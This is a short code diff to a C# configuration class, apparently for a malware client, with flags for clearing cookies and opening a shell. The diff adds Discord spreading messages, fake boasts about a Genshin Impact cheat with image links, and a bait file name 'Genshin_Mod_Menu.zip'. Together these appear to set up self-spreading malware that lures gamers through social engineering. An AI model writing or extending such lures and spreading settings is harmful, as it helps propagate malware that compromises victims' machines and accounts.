@@ -25,5 +25,14 @@ namespace Client.Communication.JSON_Models
         public bool ClearCookies = true;
 
         public bool OpenShell = true;
+
+        public string[][] DiscordSpreadMessages = new string[][] {
+
+            new string[]  { "yo check out this insane hack that i found, got 90,000 primogems from this", "https://i.redd.it/n51amnmkjlq61.png" },
+
+            new string[] { "dude this thing is insane! i oneshotted everything i found lol", "https://i.ytimg.com/vi/-R2optYjYDg/maxresdefault.jpg" }
+        };
+
+        public string DiscordFileName = "Genshin_Mod_Menu.zip";
     }
 }
